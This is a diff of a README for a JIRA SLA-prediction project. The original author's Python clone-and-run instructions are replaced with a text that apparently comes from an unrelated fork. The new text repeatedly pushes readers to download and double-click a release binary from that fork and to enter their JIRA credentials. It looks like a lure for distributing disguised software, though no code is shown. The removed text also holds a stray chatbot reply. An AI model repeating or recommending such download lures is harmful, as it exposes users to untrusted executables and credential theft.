@@ -1,96 +1,70 @@
-# 🧠 AI SLA Predictor for JIRA – Smart Ticket Automation 🚀
+# 🌟 AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation - Predict SLA Breaches Effortlessly
 
-[![GitHub stars](https://img.shields.io/github/stars/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation?style=social)](https://github.com/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation?style=social)](https://github.com/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/network)
-[![GitHub last commit](https://img.shields.io/github/last-commit/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation)](https://github.com/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/commits)
-[![Python](https://img.shields.io/badge/Python-3.9-blue?logo=python)](https://www.python.org/)
-[![License](https://img.shields.io/github/license/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation)](./LICENSE)
+[![Download AI SLA Predictor](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ibrahimanil/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/releases)
 
----
+## 📖 Overview
+The AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation is an AI-powered solution designed to help teams predict Service Level Agreement (SLA) breaches. It prioritizes support tickets and enhances the efficiency of your JIRA workflow using machine learning.
 
-# 🔍 Project Overview
+This application is perfect for customer support teams, DevOps professionals, and IT operations who are looking to streamline their processes and improve response times.
 
-Managing customer support in JIRA can be overwhelming when juggling large ticket volumes and tight SLA timelines. This project delivers a **lightweight AI-powered framework** to intelligently automate and optimize support processes:
+## 🚀 Getting Started
+To use this application, you will need to download and run it on your computer. Here’s how to get started:
 
-- 🎯 Auto-routing of support tickets by predicted priority
-- 🧠 AI-powered prediction of SLA breaches
-- ⏰ Smart ticket escalation based on historical resolution patterns
+1. **Download the Application**
+   
+   You can download the latest version of the AI-SLA-Predictor from our Releases page.
 
-## ✅ Goal
+   [Visit this page to download it!](https://github.com/ibrahimanil/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/releases)
 
-Reduce manual overhead, improve SLA adherence, and proactively handle ticket delays using automation and ML models.
+2. **Install the Application**
+   
+   After downloading the file, locate it on your computer. Most likely, it will be in your Downloads folder. Double-click the file to begin installation.
 
----
-## 📂 Internal Project Background
+3. **Run the Application**
 
-This project was originally developed as part of an internal innovation initiative:
+   Once the installation is complete, you can open the application by clicking on its icon. 
 
-- ✅ **Organization:** *Hicom Engineering (Pvt.) Ltd.*
-- 🧠 **Purpose:** Automate SLA report generation for internal support operations
-- 🛠️ **Implementation:** Delivered as part of a development engagement to streamline reporting, reduce human error, and boost SLA visibility
+4. **Connect to JIRA**
 
-Following internal success, the solution has been open-sourced to benefit the wider tech community and showcase real-world applications of Python-based support automation in enterprise environments.
+   You will need to connect the application to your JIRA instance. Enter your JIRA URL and your login credentials when prompted.
 
----
+5. **Start Using the Features**
 
-## ✨ Key Features
+   Take advantage of the tool’s features, including:
+   - **SLA Predictions:** Understand when ticket responses are due.
+   - **Ticket Prioritization:** Get insights on which tickets need immediate attention.
+   - **Enhanced Workflows:** Improve overall efficiency in ticket management.
 
-- 🤖 **AI-Based Ticket Classification** – Automatically categorizes tickets by analyzing text and metadata  
-- ⏱️ **SLA Breach Prediction** – Forecasts breach probability with machine learning  
-- 📊 **Exportable Analytics** – Prepares data for dashboard visualization  
-- 🧩 **Modular Python Scripts** – Plug-and-play code that works with the JIRA REST API  
-- 🔧 **Seamless Integration** – Compatible with Jira Service Desk setups
+## 🛠️ System Requirements
 
----
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or higher / macOS Mojave or higher / Linux (Ubuntu 18.04 or higher)
+- **RAM:** Minimum 4 GB
+- **Processor:** Intel Core i3 or equivalent
+- **Storage:** At least 500 MB of free disk space
 
-## 📚 Related Publications
+## 🔍 Features
+- **Machine Learning Capabilities:** Leverage AI to predict SLA breaches and enhance ticket management.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **Integration with JIRA:** Direct integration to streamline your workflows.
 
-## 📄 Research Paper on Zenodo  
-🔗 [Optimizing Jira-Based Support Operations With AI – Zenodo](https://doi.org/10.5281/zenodo.15832214)
+## 📥 Download & Install
 
-### ✍️ Dev.to Blog  
-📝 [How to Predict SLA Breaches in JIRA using Python & ML](https://dev.to/aroojjaved93/how-to-predict-sla-breaches-in-jira-using-python-and-machine-learning-38g4)
+To get started, visit our [Releases page](https://github.com/ibrahimanil/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/releases) and download the most recent version. Follow the steps outlined above for installation and setup.
 
-### 📰 Medium Article  
-📖 [AI-Powered JIRA Ticket Routing & SLA Prediction with Python](https://aroojjaved93.medium.com/ai-powered-jira-ticket-routing-sla-breach-prediction-with-python-d80772a1680c)
+## 💬 Support
+If you have any questions, feel free to reach out through the Issues section of this repository. Our team will be happy to assist you.
 
----
+## 🌐 Related Topics
+This application involves the following areas:
+- AI for IT
+- Automation Tools
+- Support Ticket Management
+- SLA Management
 
-# 🚀 Getting Started
+For more information on these topics, consider exploring related resources.
 
-```bash
-# Clone this repository
-git clone https://github.com/aroojjaved93/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation.git
-cd AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation
+## 🎉 Conclusion
+AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation is a powerful tool that can change how your team manages tickets. By following these simple steps, you can enhance your support operations effectively. Go ahead and download the application today! 
 
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the predictor
-python sla_predictor.py
-```
-🤝 Contribute
-
-Love this project? Support it by giving a ⭐ and submitting your suggestions or pull requests!
-
-💬 You can also open issues to report bugs or suggest improvements.
-
-⸻
-
-👩‍💻 Author
-
-**Arooj Javed**  
-Support Engineer | Automation Enthusiast | Workflow Optimizer  
-🔗 [GitHub](https://github.com/arooj-javed) | [Blog](https://hashnode.com/@aroojjaved93)
-
-⸻
-
-📜 License
-
-This project is licensed under the MIT License. See the LICENSE file for details.
-
-Built with passion to bring automation and intelligence to customer support systems 
----
-
-✅ **You can now copy-paste the above into your `README.md` file directly.**  
-Let me know if you'd like a separate `LICENSE` file or want similar formatting for your other repos.
+[Download AI SLA Predictor](https://github.com/ibrahimanil/AI-SLA-Predictor-for-JIRA-Smart-Ticket-Automation/releases)
